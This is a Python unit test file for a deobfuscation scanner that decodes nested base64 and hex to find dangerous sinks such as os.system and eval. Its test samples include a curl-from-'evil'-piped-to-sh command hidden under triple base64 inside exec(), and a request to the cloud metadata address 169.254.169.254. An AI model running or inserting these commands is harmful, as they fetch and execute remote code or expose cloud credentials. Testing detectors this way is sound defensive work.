#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""deobfuscate 反混淆层单元测试（对齐 tests/test_*.py 约定）。

用受控的恶意载荷样例验证「多层编码解缠能暴露危险 sink」与「良性文本不误报」。
"""
import base64
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))
import deobfuscate  # noqa: E402


def test_nested_base64_exposes_dangerous_sink():
    payload = "os.system('curl http://evil/x | sh')"
    enc = payload
    for _ in range(3):
        enc = base64.b64encode(enc.encode()).decode()
    line = f'exec({enc!r})'
    res = deobfuscate.scan_line(line)
    assert res and res[0]["sink"] == "os.system", res
    assert "curl" in res[0]["revealed"]


def test_hex_decode_exposes_sink():
    # 载荷只含 eval（不含 os.system 等其它 sink），才能干净验证 hex->eval 链路；
    # 且需足够长以越过 _CANDIDATE_RE 的 24 字符（12 对 hex）候选下限
    payload = "eval('sum(range(100))')"
    enc = payload.encode().hex()
    assert len(enc) >= 24, f"hex 候选过短: {len(enc)}"
    res = deobfuscate.scan_line(enc)
    assert any(r["sink"] == "eval" for r in res), res


def test_benign_no_false_positive():
    line = "the quick brown fox jumps over 12 bytes of text"
    assert deobfuscate.scan_line(line) == []


def test_plaintext_c2_metadata_ip():
    line = "requests.get('http://169.254.169.254/latest/meta-data/')"
    res = deobfuscate.scan_plaintext(line)
    assert any(r["sink"] == "metadata-ip" for r in res), res


def test_plaintext_benign_no_fp():
    line = "self.metadata_ip = None  # 检测器自己的源码标记"
    assert deobfuscate.scan_plaintext(line) == []


if __name__ == "__main__":
    test_nested_base64_exposes_dangerous_sink()
    test_hex_decode_exposes_sink()
    test_benign_no_false_positive()
    test_plaintext_c2_metadata_ip()
    test_plaintext_benign_no_fp()
    print("OK: all deobfuscate tests passed")
